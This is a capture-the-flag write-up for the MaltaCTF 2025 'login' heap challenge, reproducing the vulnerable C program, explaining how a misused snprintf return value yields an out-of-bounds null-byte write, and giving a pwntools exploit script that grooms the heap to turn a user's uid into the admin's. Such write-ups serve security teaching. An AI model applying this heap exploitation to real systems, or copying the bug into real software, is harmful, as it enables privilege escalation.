+++
author = "Velobobo"
title = "MaltaCTF 2025 - Login"
date = "2025-06-22"
description = ""
draft = false
slug = "malta-2025-login"
ctfs = ["MaltaCTF-2025"]
tags = [
    "heap",
    "ctf"
]
categories = [
    "pwn"
]

+++

# Challenge: login – MaltaCTF 2025

This was a heap challenge with a subtle bug in a `snprintf()` call that allows a **heap-based null byte overwrite**, giving us a path to become the **admin** and read the flag.


##  Overview

The binary simulates a simple multi-user system with features to:
- Create and delete users
- View and select a current user
- Log in as the `admin` user to get the flag

Only the user with UID `0` (i.e. the `admin`) can access the flag.

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

#define NAME_LEN 0x24
#define BIO_LEN 0x30
#define USER_COUNT 0x10

#define ADMIN_UID 0
#define USER_UID 1

typedef struct user {
    unsigned int uid;
    char name[NAME_LEN];
    char bio[BIO_LEN];
} user_t;

unsigned int curr_uid = 1000;
user_t admin;
user_t* users[USER_COUNT];
unsigned int current_user;



int getint(const char* msg) {
    printf(msg);
    char buf[0x8] = {};
    int choice = -1;
    read(0, buf, sizeof(buf));
    return atoi(buf);
    
}

int menu() {
    printf("1) Create user\n");
    printf("2) Select user\n");
    printf("3) Print users\n");
    printf("4) Delete user\n");
    printf("4) Login\n");
    printf("5) Exit\n");
    return getint("> ");

}

int create() {
    int idx = -1;
    int ret = -1;
    
    char namebuf[NAME_LEN] = {};
    printf("Enter user index.\n");
    idx = getint("> ");
    if (idx < 0 || idx >= USER_COUNT) {
        printf("Invalid user index!\n");
        return -1;
    }

    users[idx] = calloc(1, sizeof(user_t));
    users[idx]->uid = curr_uid++;

    printf("Enter user name.\n> ");
    ret = read(0, users[idx]->name, NAME_LEN - 1);
    if (ret < 0) {
        printf("Failed to read user name!\n");
        free(users[idx]);
        users[idx] = NULL;
        return -1;
    }
    users[idx]->name[ret-1] = '\0';

    ret = snprintf(users[idx]->bio, BIO_LEN - 1, "%s is a really cool hacker\n", users[idx]->name);
    if (ret < 0) {
        printf("Failed to create user bio\n");
        free(users[idx]);
        users[idx] = NULL;
        return -1;
    }
    users[idx]->bio[ret-1] = '\0';

    return 0;
}

int select_user() {
    int idx = -1;
    printf("Enter user index.\n");
    idx = getint("> ");
    if (idx < 0 || idx >= USER_COUNT || !users[idx]) {
        printf("Invalid user index!\n");
        return -1;
    }

    current_user = idx;
    return 0;
}

int delete_user() {
    int idx = -1;
    printf("Enter user index.\n");
    idx = getint("> ");
    if (idx < 0 || idx >= USER_COUNT || !users[idx]) {
        printf("Invalid user index!\n");
        return -1;
    }

    free(users[idx]);
    users[idx] = NULL;
    return 0;
}

void print_users() {
    for (int i = 0; i < USER_COUNT; i++) {
        if (!users[i]) continue;

        printf("User %d\n", i);
        printf("UID : %u\n", users[i]->uid);
        printf("Name: %s\n", users[i]->name);
        printf("Bio : %s\n\n", users[i]->bio);
    }
}

int login() {
    if (users[current_user] && users[current_user]->uid == ADMIN_UID) {
        int fd = open("flag.txt", O_RDONLY);
        char buf[0x100] = {};
        if (fd < 0) {
            printf("Flag file does not exist.. if this is on remote, contact an admin.\n");
            return -1;
        }

        read(fd, buf, 0x100);
        printf("Hi admin, here is your flag: %s\n", buf);
        return 0;
        
    } else {
        printf("You don't have permission to do that....\n");
        return -1;
    }
    
}

void setup() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
}

int main(void) {
    setup();
    admin.uid = 0;
    strcpy(admin.name, "admin");

    while (1) {
        int choice = menu();
        switch (choice) {
            case 1: 
                if (create() < 0) {
                    printf("Failed to create user!\n");
                }
                break;
             case 2: 
                if (select_user() < 0) {
                    printf("Failed to create user!\n");
                }
                break;
            
            case 3: 
                print_users();
                break;
                
            case 4: 
                if (delete_user() < 0) {
                    printf("Failed to delete user!\n");
                }
                break;
                
            case 5: 
                if (login() < 0) {
                    printf("Failed to login!\n");
                }
                break;
            case 6:
                return 0;
                break;

            default:
                printf("Invalid choice.\n");
                break;
        }
    }
}
```


##  Vulnerability

The vulnerability lies in this part of the `create()` function:

```c
ret = snprintf(users[idx]->bio, BIO_LEN - 1, "%s is a really cool hacker\n", users[idx]->name);
users[idx]->bio[ret - 1] = '\0';
```

Here’s what’s wrong:

- `snprintf()` returns the **total number of characters it would have written**, even if the output is truncated.
- If the `name` input is long, `ret` will be larger than `BIO_LEN`, and `bio[ret - 1] = '\0'` will write a null byte **out of bounds** into the **next chunk’s memory**.

That gives us a **heap-based null byte overflow** primitive.


##  Exploitation Plan

We want to Exploit the overflow to null out part of a neighboring user’s `uid`.

But we face a challenge: the `name` field can only hold 34 bytes (actually 35 bytes but the last byte is null byte and when we pass it into the %s for blog text it takes only the bytes before the null byte)  
The suffix `" is a really cool hacker\n"` is 25 bytes. That means `ret=snprintf()` maxes out at `34 + 25 = 59` => ret-1=58 — so we can only overwrite at a maximum offset **58** from the start of `bio`.

Let’s understand memory layout:

```
user_t (from calloc) => 0x60 bytes chunk
  [ uid 4 bytes | name 36 bytes | bio 48 bytes ]
```

If two `user_t` chunks are next to each other:

```
Chunk 1: [prev-size][size][uid][name][bio]
Chunk 2: [prev-size][size][uid][name][bio]
```
But as prev-size field of next chunk is usable memory for the chunk before  it so we have the structure like
```
[prev-chunk bio][next-chunk size][next-chunk uid]
```
At start uid=1000=0x3E8
```
E8      03      00      00
bio[59] bio[58] bio[57] bio[56]
```
so we can only overwrite this 3rd nibble 03 , so this doesnt solve our problem. One thing we can do is if we create more users till our target uid=0x400=1024 , 00 04 00 00 
then we can achieve uid=0 by overwriting the 3rd nibble only

So if we can:
- Arrange two adjacent chunks,
- Overflow `bio[58]`,
- And ensure the **target UID is `0x00000400`** (`00 04 00 00`),
- Then overwriting `bio[58]= 0x00` makes it → `00 00 00 00` (UID 0 = admin)


##  Heap Feng Shui

As calloc doesnt allocate chunks from tcache , we first have to fill tcache so that the next freed entry goes to fastbin and then we can achieve ptr reuse by using the chunk from fastbin
To place chunks adjacently, we:

1. **Fill the tcache bin** for size `0x60` (7 entries).
2. Force freed chunks to go into **fastbin**.
3. Use **Use-After-Free (UAF)** behavior to allocate a chunk adjacent to another.

##  Exploit Script

```python
from pwn import *

p = remote("login.shared.challs.mt", 1337)
uid = 999

def adduser(index, name):
    global uid
    p.recvuntil(b'> ')
    p.sendline(b'1')           # Create user
    p.recvuntil(b'> ')
    p.sendline(index)
    p.recvuntil(b'> ')
    p.send(name)
    uid += 1
    print(f"[+] Added user {uid}")

def deleteuser(index):
    p.recvuntil(b'> ')
    p.sendline(b'4')           # Delete user
    p.recvuntil(b'> ')
    p.sendline(index)

# Fill tcache bin
for i in range(7):
    adduser(b'0', b'abc')
    deleteuser(b'0')

# Push UID counter up to 1024 (0x400)
while uid <= 1021:
    adduser(b'0', b'abc')
    deleteuser(b'0')

# Create user with uid=1024
adduser(b'0', b'A')            # This should be UID=1023
adduser(b'1', b'BBBBBBBBB')    # This should be UID=1024
deleteuser(b'0')               # Free the first

# Trigger the overflow — overwrite byte at bio[58] to null out UID=1024 → UID=0
adduser(b'0', b'A'*34)

# Now user at index 1 should be UID=0 (admin), so select and login
p.sendline(b'2')               # Select user
p.recvuntil(b'> ')
p.sendline(b'1')

p.sendline(b'5')               # Login
p.interactive()
```

##  Result
{{< figure src="result.png" alt="Script-Output" width="500" >}}
{{< figure src="flag.png" alt="flag" width="500" >}}
